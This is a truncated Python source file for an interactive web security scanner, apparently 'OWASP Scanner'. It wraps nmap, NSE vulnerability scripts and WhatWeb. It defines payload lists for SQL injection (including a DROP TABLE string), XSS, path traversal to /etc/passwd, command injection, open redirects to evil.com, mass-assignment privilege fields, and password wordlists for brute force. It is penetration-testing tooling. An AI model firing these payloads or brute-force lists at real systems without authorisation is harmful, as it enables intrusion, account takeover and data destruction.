#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OWASP Scanner
Web Security Testing Scanner - Interactive & Authenticated Edition
Author: Elilan Baskaran
Description: Full web spidering, directory fuzzing (ffuf with progress), injections, API tests, user enumeration & bruteforce.
"""

import argparse
import base64
import getpass
import re
import signal
import sys
import ssl
import socket
import tempfile
import time
import json
import os
import subprocess
import shutil
import platform
import html
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from collections import deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.robotparser import RobotFileParser


# ===== INPUT WITH PATH AUTOCOMPLETE (TAB) =====
if os.name == 'nt':
    try:
        from prompt_toolkit import prompt
        from prompt_toolkit.completion import PathCompleter
        def input_path(prompt_text):
            return prompt(prompt_text, completer=PathCompleter(), complete_while_typing=True)
    except ImportError:
        def input_path(prompt_text):
            return input(prompt_text)
else:
    try:
        import readline
        import glob
        readline.set_history_length(100)
        class FilePathCompleter:
            def complete(self, text, state):
                line = readline.get_line_buffer().split()
                if not line:
                    return [None][state]
                else:
                    matches = glob.glob(text+'*')
                    try:
                        return matches[state]
                    except IndexError:
                        return None
        readline.set_completer_delims(' \t\n;')
        readline.set_completer(FilePathCompleter().complete)
        readline.parse_and_bind('tab: complete')
        def input_path(prompt_text):
            return input(prompt_text)
    except ImportError:
        def input_path(prompt_text):
            return input(prompt_text)

import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.exceptions import InsecureRequestWarning
try:
    from urllib3.util.retry import Retry
except ImportError:  # urllib3 < 1.26 bundled inside requests
    from requests.packages.urllib3.util.retry import Retry

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False
    print("[!] BeautifulSoup4 is not installed. Using basic parsing.")

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    HAS_COLOR = True
except ImportError:
    HAS_COLOR = False
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = BLUE = LIGHTBLACK_EX = RESET = ''
    class Style:
        BRIGHT = DIM = NORMAL = RESET_ALL = ''

try:
    from tqdm import tqdm
    HAS_TQDM = True
except ImportError:
    HAS_TQDM = False

try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False
    class tqdm:
        def __init__(self, iterable=None, total=None, **kwargs):
            self.iterable = iterable
            self.total = total
        def __iter__(self):
            return iter(self.iterable or [])
        def __enter__(self):
            return self
        def __exit__(self, *a):
            return False
        def update(self, n=1):
            pass
        def set_postfix(self, *a, **k):
            pass
        def close(self):
            pass

# ========== BANNER ==========
BANNER = r"""
   ____  _       _____   _____ ____    _____                                 
  / __ \| |     / /   | / ___// __ \  / ___/_________ _____  ____  ___  _____
 / / / /| | /| / / /| | \__ \/ /_/ /  \__ \/ ___/ __ `/ __ \/ __ \/ _ \/ ___/
/ /_/ / | |/ |/ / ___ |___/ / ____/  ___/ / /__/ /_/ / / / / / / /  __/ /    
\____/  |__/|__/_/  |_/____/_/      /____/\___/\__,_/_/ /_/_/ /_/\___/_/     
"""
DESCRIPTION = "OWASP Scanner - Web Security Testing Toolkit"
DEVELOPER = "developed by Elilan Baskaran"
VERSION = "1.4.2"

# ========== CONFIGURATION ==========
DEFAULT_TIMEOUT = 10
MAX_REDIRECTS = 10
THREADS = 5
HTTP_RETRIES = 2          # Retries for transient network errors (not HTTP status responses)
HTTP_POOL_SIZE = 50       # Reusable connections per host (sized for threaded modules)
AUTHENTICATED = False
AUTH_SESSION = None
TARGET_URL = ""
REQUEST_DELAY = 0.0  # Delay between requests (seconds)
OUTPUT_FILE = None   # Report output path
VERIFY_TLS = True    # TLS verification (can be disabled with --insecure)
FINDINGS = []        # Accumulated findings for the report

def _fresh_scan_data():
    """Empty SCAN_DATA structure. Used at startup and when switching targets."""
    return {
        "general": {},
        "authentication": {},
        "robots_paths": [],
        "http_methods": [],
        "nmap": {},
        "active_directory": {},
        "vhosts": [],
        "directory_hits": [],
        "injection": {},
        "api_endpoints": [],
        "users": [],
        "emails": [],
        "bruteforce_credentials": [],
        "wordpress_detection": {},
        "wordpress": {},
        "spider": {},
        "source_code_analysis": {},
        "advanced_security": {},
        "stats": {},
    }

SCAN_DATA = _fresh_scan_data()

COMMON_DIRS = [
    "admin", "backup", "cgi-bin", "css", "js", "images", "uploads", "download",
    "include", "inc", "config", "api", "v1", "old", "test", "dev", "hidden",
    "robots.txt", "sitemap.xml", ".git/HEAD", ".git/config", ".env", ".env.backup",
    "phpinfo.php", "info.php", "backup.zip", "backup.sql", "dump.sql",
    "wp-admin", "wp-content", "administrator", "phpmyadmin", "adminer.php",
    ".htaccess", ".htpasswd", "web.config", "crossdomain.xml", "clientaccesspolicy.xml",
    ".well-known/security.txt", "package.json", "composer.json", "server-status"
]

SECLISTS_SMALL = "/usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt"
SECLISTS_MEDIUM = "/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt"
SECLISTS_PASSWORDS = "/usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt"
ROCKYOU_WORDLIST = "/usr/share/wordlists/rockyou.txt"
ROCKYOU_WORDLIST_GZ = "/usr/share/wordlists/rockyou.txt.gz"
SECLISTS_DNS = "/usr/share/seclists/Discovery/DNS/namelist.txt"
SECLISTS_USERS = "/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
SECLISTS_USERS_SHORT = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
DEFAULT_PASSWORDS = [
    "123456", "password", "123456789", "12345", "12345678", "qwerty", "abc123", "admin", "letmein", "welcome"
]

# Payloads
SQL_PAYLOADS = [
    "'", "''", "\"", "\\", "' OR '1'='1", "' OR 1=1--",
    "1 AND 1=1", "1 AND 1=2", "' UNION SELECT NULL--", "'; DROP TABLE users--",
    "' OR SLEEP(5)-- ", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>", "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>", "javascript:alert('XSS')",
    "<svg/onload=alert(1)>", "'-alert(1)-'", "\"-alert(1)-\""
]

PATH_TRAVERSAL = [
    "../../../../etc/passwd", "..\\..\\..\\windows\\win.ini",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "....//....//....//etc/passwd"
]

COMMAND_INJECT = [
    "; ls", "| dir", "|| ping -c 1 127.0.0.1", "& whoami",
    "$(whoami)", "`whoami`", "| net user"
]

OPEN_REDIRECT = ["https://evil.com", "//evil.com", "/redirect?url=https://evil.com"]

API_ENDPOINTS = [
    # API roots
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3", "/rest", "/rest/v1",
    # Common resources
    "/api/users", "/api/user", "/api/accounts", "/api/account",
    "/api/admin", "/api/me", "/api/profile", "/api/whoami",
    "/api/config", "/api/settings", "/api/flags", "/api/data",
    "/api/keys", "/api/tokens", "/api/secrets", "/api/credentials",
    "/api/debug", "/api/test", "/api/internal",
    "/rest/users", "/rest/user", "/rest/admin", "/rest/profile",
    # OpenAPI / Swagger documentation
    "/swagger", "/swagger-ui.html", "/swagger-ui/", "/swagger.json", "/swagger.yaml",
    "/openapi.json", "/openapi.yaml",
    "/api-docs", "/v2/api-docs", "/v3/api-docs",
    "/redoc", "/docs", "/api/docs", "/api/swagger",
    # GraphQL
    "/graphql", "/graphiql", "/api/graphql", "/query", "/api/query",
    # Spring Actuator / monitoring
    "/actuator", "/actuator/env", "/actuator/health", "/actuator/mappings",
    "/actuator/beans", "/actuator/httptrace", "/actuator/loggers",
    "/health", "/metrics", "/info", "/status", "/ping",
    # Authentication paths
    "/api/auth", "/api/login", "/api/token", "/api/refresh",
    "/api/register", "/api/signup",
    # Paths sensibles
    "/.well-known/", "/api/version", "/api/changelog",
    "/console", "/api/console", "/h2-console",
]

MASS_ASSIGNMENT_FIELDS = [
    {"is_admin": True},
    {"role": "admin"},
    {"admin": True},
    {"isAdmin": True},
    {"privilege": "admin"},
    {"user_role": "administrator"},
    {"account_type": "premium"},
    {"verified": True},
    {"status": "active"},
    {"credits": 9999},
    {"balance": 9999},
    {"permissions": ["admin", "superuser"]},
]

LOGIN_PATHS = [
    "/login", "/signin", "/auth", "/logon", "/login.php", "/login.html",
    "/user/login", "/account/login", "/admin/login", "/wp-login.php"
]

# Typical API prefixes used as a base for recursive fuzzing
API_BASE_PREFIXES = [
    "/api", "/api/v1", "/api/v2", "/api/v3",
    "/v1", "/v2", "/v3",
    "/rest", "/rest/v1", "/rest/v2",
    "/services", "/services/api",
]

# Typical REST resources. Tested under each active API prefix
# (for example /api/v1/users, /api/v1/transfer, etc.)
API_REOSURCES = [
    # Identity / accounts
    "users", "user", "accounts", "account", "me", "profile", "whoami",
    "auth", "login", "logout", "register", "signup", "signin",
    "token", "tokens", "refresh", "session", "sessions",
    "password", "reset-password", "forgot-password", "2fa", "mfa", "otp",
    # Admin / configuration
    "admin", "config", "settings", "flags", "feature-flags",
    "permissions", "roles", "groups", "privileges",
    "audit", "audit-log", "logs", "events",
    # Datos / negocio
    "data", "items", "products", "orders", "invoices", "payments",
    "transactions", "transfer", "transfers", "wallets", "balance",
    "subscriptions", "plans", "billing", "cart", "checkout",
    "notes", "messages", "chats", "comments", "posts", "articles",
    "files", "uploads", "documents", "attachments", "media", "images",
    # Search / metadata
    "search", "filter", "query", "tags", "categories",
    # Operational / hidden
    "stats", "metrics", "health", "status", "version", "info",
    "debug", "test", "internal", "private", "hidden",
    "keys", "secrets", "credentials", "api-keys",
    "export", "import", "backup", "dump", "report", "reports",
    "notifications", "webhooks", "callbacks", "subscribe",
    "feed", "feeds", "activity", "history",
]

# ========== UTILIDADES ==========
def clear_screen():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

def check_ffuf():
    return shutil.which("ffuf") is not None

def check_wpscan():
    return shutil.which("wpscan")

def install_wpscan():
    """Offers to install WPScan with gem when unavailable."""
    print_warning("WPScan is not installed or is not in PATH.")
    if os.name == 'nt':
        print_info("Install it manually with Ruby/Gem or run the scanner from Kali/WSL: gem install wpscan")
        return False
    try:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install WPScan automatically with sudo gem install wpscan? [y/N]:")
        resp = input("> ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return False
    if resp not in ('y', 's'):
        return False
    try:
        print_info("Running: sudo gem install wpscan")
        subprocess.run(["sudo", "gem", "install", "wpscan"], check=True)
        if check_wpscan():
            print_good("WPScan installed successfully.")
            return True
        print_error("The installation appears to have failed.")
        return False
    except Exception as e:
        print_error(f"Could not install WPScan: {e}")
        return False

def _wait_for_interrupted_child(process, name="proceso", grace_seconds=5):
    """Give an interrupted child process time to flush files before killing it."""
    if not process:
        return None
    if process.poll() is not None:
        return process.returncode

    try:
        return process.wait(timeout=grace_seconds)
    except subprocess.TimeoutExpired:
        pass

    if os.name != 'nt' and process.poll() is None:
        try:
            process.send_signal(signal.SIGINT)
            return process.wait(timeout=2)
        except Exception:
            pass

    if process.poll() is None:
        print_warning(f"{name} did not exit after Ctrl+C; terminating process.")
        try:
            process.terminate()
            return process.wait(timeout=2)
        except subprocess.TimeoutExpired:
            process.kill()
            try:
                return process.wait(timeout=2)
            except Exception:
                return process.returncode
        except Exception:
            return process.returncode
    return process.returncode

def _load_ffuf_json_results(path):
    if not path or not os.path.isfile(path) or os.path.getsize(path) <= 2:
        return []
    with open(path, 'r', encoding='utf-8') as f:
        data = json.load(f)
    if isinstance(data, dict):
        results = data.get('results', [])
        return results if isinstance(results, list) else []
    if isinstance(data, list):
        return data
    return []

def check_whatweb():
    return shutil.which("whatweb") is not None

def install_whatweb():
    """Offer to install WhatWeb via apt if it is unavailable."""
    print_warning("WhatWeb is not installed.")
    try:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install WhatWeb automatically? (requires sudo) [y/N]:")
        resp = input("> ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return False
    if resp not in ('y', 's'):
        return False
    try:
        print_info("Running: sudo apt-get install -y whatweb")
        ret = subprocess.run(
            ["sudo", "apt-get", "install", "-y", "whatweb"],
            check=True
        )
        if check_whatweb():
            print_good("WhatWeb installed successfully.")
            return True
        else:
            print_error("The installation appears to have failed.")
            return False
    except Exception as e:
        print_error(f"Could not install WhatWeb: {e}")
        return False

def run_whatweb(target, session=None):
    """Runs WhatWeb and formats its output."""
    if not check_whatweb():
        if not install_whatweb():
            return None

    # Categorys de color
    CATEGORY_COLOR = {
        'cms':         Fore.MAGENTA,
        'framework':   Fore.MAGENTA,
        'language':    Fore.CYAN,
        'server':      Fore.CYAN,
        'javascript':  Fore.YELLOW,
        'jquery':      Fore.YELLOW,
        'analytics':   Fore.YELLOW,
        'security':    Fore.GREEN,
        'email':       Fore.WHITE,
        'country':     Fore.WHITE,
        'ip':          Fore.WHITE,
        'title':       Fore.WHITE,
        'httpserver':  Fore.CYAN,
        'x-powered-by':Fore.CYAN,
    }

    try:
        cmd = ["whatweb", "--color=never"]
        cmd = _append_whatweb_session_options(cmd, session)
        cmd.append(target)
        if session and _external_http_headers_from_session(session):
            print_info("WhatWeb will use headers/cookies from the authenticated session.")
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=30
        )
        raw = result.stdout.strip()
        if not raw:
            print_warning("WhatWeb returned no results.")
            return []

        # WhatWeb brief format: URL [STATUS] Plugin1[val], Plugin2[val], ...
        technologies = []
        SEP = "─" * 60
        print(f"\n{Fore.CYAN}{SEP}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}  WHATWEB - Technology detection{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{SEP}{Style.RESET_ALL}")

        for line in raw.splitlines():
            line = line.strip()
            if not line:
                continue
            # Extract plugins from the line
            # Format: http://host [200 OK] Plugin1, Plugin2[value], ...
            bracket_match = re.match(r'^(https?://\S+)\s+\[([^\]]+)\]\s*(.*)', line)
            if not bracket_match:
                # Unparsed line -> show raw output
                print(f"  {line}")
                continue

            url_part    = bracket_match.group(1)
            status_part = bracket_match.group(2)
            plugins_raw = bracket_match.group(3)

            # HTTP status color
            http_code = status_part.split()[0] if status_part else ''
            if http_code.startswith('2'):
                sc = Fore.GREEN
            elif http_code.startswith('3'):
                sc = Fore.CYAN
            elif http_code.startswith('4'):
                sc = Fore.YELLOW
            elif http_code.startswith('5'):
                sc = Fore.RED
            else:
                sc = Fore.WHITE

            print(f"  {Fore.WHITE}{url_part}{Style.RESET_ALL}  "
                  f"{sc}[{status_part}]{Style.RESET_ALL}")

            if not plugins_raw:
                continue

            # Separar plugins respetando corchetes anidados
            plugins = []
            depth, start = 0, 0
            for i, ch in enumerate(plugins_raw):
                if ch == '[':
                    depth += 1
                elif ch == ']':
                    depth -= 1
                elif ch == ',' and depth == 0:
                    p = plugins_raw[start:i].strip()
                    if p:
                        plugins.append(p)
                    start = i + 1
            tail = plugins_raw[start:].strip()
            if tail:
                plugins.append(tail)

            for plugin in plugins:
                # Split the name from the value inside brackets
                pm = re.match(r'^([A-Za-z0-9_\-\./ ]+?)(?:\[(.+)\])?$', plugin, re.DOTALL)
                if pm:
                    name = pm.group(1).strip()
                    value = pm.group(2).strip() if pm.group(2) else ''
                else:
                    name, value = plugin.strip(), ''

                technologies.append({"name": name, "detail": value})
                key = name.lower().replace(' ', '').replace('-', '')
                color = next(
                    (v for k, v in CATEGORY_COLOR.items() if k in key),
                    Fore.WHITE
                )
                if value:
                    print(f"    {color}▸ {name:<28}{Style.RESET_ALL}  "
                          f"{Fore.WHITE}{value[:60]}{Style.RESET_ALL}")
                else:
                    print(f"    {color}▸ {name}{Style.RESET_ALL}")

        print(f"{Fore.CYAN}{SEP}{Style.RESET_ALL}\n")
        # Remove duplicates by (name, detail)
        seen = set()
        unique_techs = []
        for t in technologies:
            key = (t['name'], t['detail'])
            if key not in seen:
                seen.add(key)
                unique_techs.append(t)
        return unique_techs

    except subprocess.TimeoutExpired:
        print_error("WhatWeb took too long (30s timeout).")
        return None
    except Exception as e:
        print_error(f"Error running WhatWeb: {e}")
        return None

def check_nmap():
    return shutil.which("nmap")

def install_nmap():
    """Offer to install nmap via apt if it is unavailable."""
    print_warning("nmap is not installed.")
    try:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install nmap automatically? (requires sudo) [y/N]:")
        resp = input("> ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return False
    if resp not in ('y', 's'):
        return False
    try:
        print_info("Running: sudo apt-get install -y nmap")
        subprocess.run(["sudo", "apt-get", "install", "-y", "nmap"], check=True)
        if check_nmap():
            print_good("nmap installed successfully.")
            return True
        print_error("The installation appears to have failed.")
        return False
    except Exception as e:
        print_error(f"Could not install nmap: {e}")
        return False

def run_nmap_scan(target):
    """Run `nmap -sV` against the target host and store ports in SCAN_DATA["nmap"].

    Parse XML output (-oX -) for robust extraction of port, state,
    service, product, and version. Shows a table when finished.
    """
    print_phase("PORT SCAN (NMAP)")
    nmap_path = check_nmap()
    if not nmap_path:
        if not install_nmap():
            print_warning("Skipping port scan.")
            return None
        nmap_path = check_nmap()
        if not nmap_path:
            return None

    host = urlparse(target).hostname or target
    if not host:
        print_error("Could not extract the host from the target.")
        return None

    print_info(f"Running: nmap -sV {host}")
    print()
    try:
        # Increased timeout because 600s can fall short on targets with many ports
        proc = subprocess.run(
            [nmap_path, "-sV", "-oX", "-", host],
            capture_output=True, text=True, timeout=1800
        )
    except subprocess.TimeoutExpired:
        print_error("nmap exceeded the 600s timeout.")
        return None
    except KeyboardInterrupt:
        print_warning("Port scan interrupted by the user.")
        return None
    except Exception as e:
        print_error(f"Error running nmap: {e}")
        return None

    xml_out = proc.stdout or ""
    if proc.returncode not in (0, 1) or not xml_out.strip().startswith("<?xml"):
        # Show stderr / stdout for diagnostics
        if proc.stderr:
            print_error(proc.stderr.strip().splitlines()[-1] if proc.stderr.strip() else f"nmap rc={proc.returncode}")
        else:
            print_error(f"nmap rc={proc.returncode}")
        return None

    ports = []
    host_info = {"address": host, "hostnames": [], "status": ""}
    try:
        import xml.etree.ElementTree as ET
        root = ET.fromstring(xml_out)
        for h in root.findall("host"):
            status_el = h.find("status")
            if status_el is not None:
                host_info["status"] = status_el.get("state", "")
            for addr in h.findall("address"):
                if addr.get("addrtype") in ("ipv4", "ipv6"):
                    host_info["address"] = addr.get("addr") or host_info["address"]
            for hn in h.findall("hostnames/hostname"):
                name = hn.get("name")
                if name:
                    host_info["hostnames"].append(name)
            for p in h.findall("ports/port"):
                state_el = p.find("state")
                svc_el = p.find("service")
                if state_el is None:
                    continue
                state = state_el.get("state", "")
                if state not in ("open", "open|filtered"):
                    continue
                entry = {
                    "port": int(p.get("portid", 0)),
                    "protocol": p.get("protocol", ""),
                    "state": state,
                    "service": (svc_el.get("name") if svc_el is not None else "") or "",
                    "product": (svc_el.get("product") if svc_el is not None else "") or "",
                    "version": (svc_el.get("version") if svc_el is not None else "") or "",
                    "extrainfo": (svc_el.get("extrainfo") if svc_el is not None else "") or "",
                }
                ports.append(entry)
    except Exception as e:
        print_error(f"Error parseando XML de nmap: {e}")
        return None

    ports.sort(key=lambda x: (x.get("port", 0), x.get("protocol", "")))

    # Tabla visual
    if ports:
        STATE_COLOR = {"open": Fore.GREEN, "open|filtered": Fore.YELLOW}
        rows = []
        for p in ports:
            color = STATE_COLOR.get(p["state"], Fore.WHITE)
            version_parts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
            version_str = " ".join([v for v in version_parts if v]).strip() or "-"
            if len(version_str) > 60:
                version_str = version_str[:57] + "..."
            rows.append([
                f"{p['port']}/{p['protocol']}",
                f"{color}{p['state']}{Style.RESET_ALL}",
                p.get("service", "") or "-",
                version_str,
            ])
        print_table(
            headers=["PORT", "STATE", "SERVICE", "VERSION"],
            rows=rows,
            alignments=['<', '<', '<', '<'],
            title=f"Open ports ({len(ports)}):",
        )
        # Record open ports in FINDINGS so they appear
        # also in the classified findings sections.
        for p in ports:
            label = p.get("service", "") or "?"
            version_str = " ".join(
                [v for v in (p.get("product", ""), p.get("version", "")) if v]
            ).strip()
            FINDINGS.append(
                f"[PORT] {host_info['address']}:{p['port']}/{p['protocol']} "
                f"{label}" + (f" ({version_str})" if version_str else "")
            )
    else:
        print_info("nmap found no visible open ports.")

    SCAN_DATA["nmap"] = {
        "host": host_info["address"],
        "hostnames": host_info["hostnames"],
        "status": host_info["status"],
        "ports": ports,
        "command": f"nmap -sV {host}",
    }
    return SCAN_DATA["nmap"]


def _parse_nmap_xml(xml_out, include_scripts=False):
    host_info = {"address": "", "hostnames": [], "status": "", "host_scripts": []}
    ports = []
    import xml.etree.ElementTree as ET
    root = ET.fromstring(xml_out)

    def _script_element_to_dict(el):
        item = {
            "key": el.get("key") or el.get("id") or "",
            "text": (el.text or "").strip(),
            "children": [],
        }
        for child in list(el):
            item["children"].append(_script_element_to_dict(child))
        return item

    def _script_to_dict(script_el):
        return {
            "id": script_el.get("id", ""),
            "output": script_el.get("output", "") or "",
            "elements": [_script_element_to_dict(child) for child in list(script_el)],
        }

    for h in root.findall("host"):
        status_el = h.find("status")
        if status_el is not None:
            host_info["status"] = status_el.get("state", "")
        for addr in h.findall("address"):
            if addr.get("addrtype") in ("ipv4", "ipv6"):
                host_info["address"] = addr.get("addr") or host_info["address"]
        for hn in h.findall("hostnames/hostname"):
            name = hn.get("name")
            if name:
                host_info["hostnames"].append(name)
        if include_scripts:
            for script_el in h.findall("hostscript/script"):
                host_info["host_scripts"].append(_script_to_dict(script_el))
        for p in h.findall("ports/port"):
            state_el = p.find("state")
            svc_el = p.find("service")
            if state_el is None:
                continue
            state = state_el.get("state", "")
            if state not in ("open", "open|filtered"):
                continue
            entry = {
                "port": int(p.get("portid", 0)),
                "protocol": p.get("protocol", ""),
                "state": state,
                "service": (svc_el.get("name") if svc_el is not None else "") or "",
                "product": (svc_el.get("product") if svc_el is not None else "") or "",
                "version": (svc_el.get("version") if svc_el is not None else "") or "",
                "extrainfo": (svc_el.get("extrainfo") if svc_el is not None else "") or "",
            }
            if include_scripts:
                entry["scripts"] = [_script_to_dict(s) for s in p.findall("script")]
            ports.append(entry)
    ports.sort(key=lambda x: (x.get("port", 0), x.get("protocol", "")))
    return host_info, ports

def _nmap_targeted_port_spec(ports):
    tcp = sorted({int(p.get("port")) for p in ports if p.get("protocol") == "tcp" and p.get("port")})
    udp = sorted({int(p.get("port")) for p in ports if p.get("protocol") == "udp" and p.get("port")})
    if tcp and not udp:
        return ",".join(str(p) for p in tcp), False
    parts = []
    if tcp:
        parts.append("T:" + ",".join(str(p) for p in tcp))
    if udp:
        parts.append("U:" + ",".join(str(p) for p in udp))
    return ",".join(parts), bool(udp)

def _nmap_http_script_args(session):
    args = []
    if not session:
        return args
    user_agent = _session_header_value(session, "User-Agent")
    if user_agent:
        args.append(f"http.useragent={user_agent}")
    cookie_string = _session_cookie_string(session) or _session_header_value(session, "Cookie")
    if cookie_string:
        args.append(f"http.cookie={cookie_string}")
    return args

def _nmap_script_interesting(script):
    output = (script.get("output") or "").lower()
    indicators = (
        "vulnerable", "cve-", "exploit", "risk factor", "state: vulnerable",
        "backdoor", "dos", "xss", "sql injection", "csrf", "traversal",
    )
    return any(ind in output for ind in indicators)

def _run_nmap_nse_scan(nmap_path, host, host_info, ports, session=None):
    if not ports:
        return {"executed": False, "reason": "no-open-ports", "results": []}

    port_spec, has_udp = _nmap_targeted_port_spec(ports)
    if not port_spec:
        return {"executed": False, "reason": "no-port-spec", "results": []}

    cmd = [
        nmap_path, "-sV",
        "--script", "default,vuln,safe",
        "-p", port_spec,
        "-oX", "-",
    ]
    if has_udp:
        cmd.insert(1, "-sU")
    script_args = _nmap_http_script_args(session)
    if script_args:
        cmd += ["--script-args", ",".join(script_args)]
    cmd.append(host)

    visible_cmd = _format_external_command(cmd)
    print_info(f"Running Targeted NSE scan: {visible_cmd}")
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=2400)
    except subprocess.TimeoutExpired:
        print_error("nmap NSE exceeded the 2400s timeout.")
        return {"executed": True, "command": visible_cmd, "error": "timeout", "results": []}
    except KeyboardInterrupt:
        print_warning("NSE scan interrupted by the user.")
        return {"executed": True, "command": visible_cmd, "error": "interrupted", "results": []}
    except Exception as e:
        print_error(f"Error running nmap NSE: {e}")
        return {"executed": True, "command": visible_cmd, "error": str(e), "results": []}

    xml_out = proc.stdout or ""
    if proc.returncode not in (0, 1) or not xml_out.strip().startswith("<?xml"):
        err = (proc.stderr or "").strip()
        if err:
            print_error(err.splitlines()[-1])
        else:
            print_error(f"nmap NSE rc={proc.returncode}")
        return {"executed": True, "command": visible_cmd, "returncode": proc.returncode, "error": err, "results": []}

    try:
        _nse_host, nse_ports = _parse_nmap_xml(xml_out, include_scripts=True)
    except Exception as e:
        print_error(f"Error parseando XML NSE de nmap: {e}")
        return {"executed": True, "command": visible_cmd, "error": str(e), "results": []}

    results = []
    for p in nse_ports:
        for script in p.get("scripts", []) or []:
            output = (script.get("output") or "").strip()
            if not output:
                continue
            item = {
                "host": host_info.get("address") or host,
                "port": p.get("port"),
                "protocol": p.get("protocol"),
                "service": p.get("service"),
                "script_id": script.get("id", ""),
                "output": output,
                "interesting": _nmap_script_interesting(script),
            }
            results.append(item)
            if item["interesting"]:
                first_line = output.splitlines()[0][:160]
                _append_finding_once(
                    f"[NMAP:NSE] {item['host']}:{item['port']}/{item['protocol']} "
                    f"{item['script_id']} - {first_line}"
                )

    by_key = {(p.get("port"), p.get("protocol")): p for p in ports}
    for p in nse_ports:
        key = (p.get("port"), p.get("protocol"))
        if key in by_key and p.get("scripts"):
            by_key[key]["scripts"] = p.get("scripts")

    if results:
        rows = []
        for item in results[:40]:
            color = Fore.RED if item.get("interesting") else Fore.CYAN
            first_line = item.get("output", "").splitlines()[0][:90]
            rows.append([
                f"{item.get('port')}/{item.get('protocol')}",
                item.get("service") or "-",
                f"{color}{item.get('script_id')}{Style.RESET_ALL}",
                first_line,
            ])
        print_table(
            headers=["Port", "Service", "Script", "Result"],
            rows=rows,
            alignments=['<', '<', '<', '<'],
            title=f"Targeted NSE Results ({len(results)} scripts with output):",
        )
        if len(results) > 40:
            print_info(f"... and {len(results) - 40} more NSE results in the report.")
    else:
        print_info("The Targeted NSE scan didn't return relevant output.")

    return {
        "executed": True,
        "command": visible_cmd,
        "returncode": proc.returncode,
        "ports_scanned": port_spec,
        "results": results,
    }

def run_nmap_scan(target, session=None):
    """Run nmap -sV and then targeted NSE against discovered ports."""
    print_phase("PORT SCAN (NMAP)")
    nmap_path = check_nmap()
    if not nmap_path:
        if not install_nmap():
            print_warning("Skipping port scan.")
            return None
        nmap_path = check_nmap()
        if not nmap_path:
            return None

    host = urlparse(target).hostname or target
    if not host:
        print_error("Could not extract the host from the target.")
        return None

    print_info(f"Running: nmap -sV {host}")
    print()
    try:
        proc = subprocess.run(
            [nmap_path, "-sV", "-oX", "-", host],
            capture_output=True, text=True, timeout=1800
        )
    except subprocess.TimeoutExpired:
        print_error("nmap exceeded the 1800s timeout.")
        return None
    except KeyboardInterrupt:
        print_warning("Port scan interrupted by the user.")
        return None
    except Exception as e:
        print_error(f"Error running nmap: {e}")
        return None

    xml_out = proc.stdout or ""
    if proc.returncode not in (0, 1) or not xml_out.strip().startswith("<?xml"):
        if proc.stderr:
            print_error(proc.stderr.strip().splitlines()[-1] if proc.stderr.strip() else f"nmap rc={proc.returncode}")
        else:
            print_error(f"nmap rc={proc.returncode}")
        return None

    try:
        host_info, ports = _parse_nmap_xml(xml_out, include_scripts=False)
        host_info["address"] = host_info.get("address") or host
    except Exception as e:
        print_error(f"Error parseando XML de nmap: {e}")
        return None

    if ports:
        STATE_COLOR = {"open": Fore.GREEN, "open|filtered": Fore.YELLOW}
        rows = []
        for p in ports:
            color = STATE_COLOR.get(p["state"], Fore.WHITE)
            version_parts = [p.get("product", ""), p.get("version", ""), p.get("extrainfo", "")]
            version_str = " ".join([v for v in version_parts if v]).strip() or "-"
            if len(version_str) > 60:
                version_str = version_str[:57] + "..."
            rows.append([
                f"{p['port']}/{p['protocol']}",
                f"{color}{p['state']}{Style.RESET_ALL}",
                p.get("service", "") or "-",
                version_str,
            ])
        print_table(
            headers=["PORT", "STATE", "SERVICE", "VERSION"],
            rows=rows,
            alignments=['<', '<', '<', '<'],
            title=f"Open ports ({len(ports)}):",
        )
        for p in ports:
            label = p.get("service", "") or "?"
            version_str = " ".join(
                [v for v in (p.get("product", ""), p.get("version", "")) if v]
            ).strip()
            _append_finding_once(
                f"[PORT] {host_info['address']}:{p['port']}/{p['protocol']} "
                f"{label}" + (f" ({version_str})" if version_str else "")
            )
    else:
        print_info("nmap did not find visible open ports.")

    nse_data = _run_nmap_nse_scan(nmap_path, host, host_info, ports, session=session) if ports else {
        "executed": False,
        "reason": "no-open-ports",
        "results": [],
    }

    SCAN_DATA["nmap"] = {
        "host": host_info["address"],
        "hostnames": host_info["hostnames"],
        "status": host_info["status"],
        "ports": ports,
        "command": f"nmap -sV {host}",
        "nse": nse_data,
        "nse_results": nse_data.get("results", []),
    }
    return SCAN_DATA["nmap"]


def check_nuclei():
    return shutil.which("nuclei")

def install_nuclei():
    """Offer to install Nuclei via apt if it is unavailable."""
    print_warning("Nuclei is not installed.")
    try:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Install Nuclei automatically? (requires sudo) [y/N]:")
        resp = input("> ").strip().lower()
    except (KeyboardInterrupt, EOFError):
        return False
    if resp not in ('y', 's'):
        return False
    try:
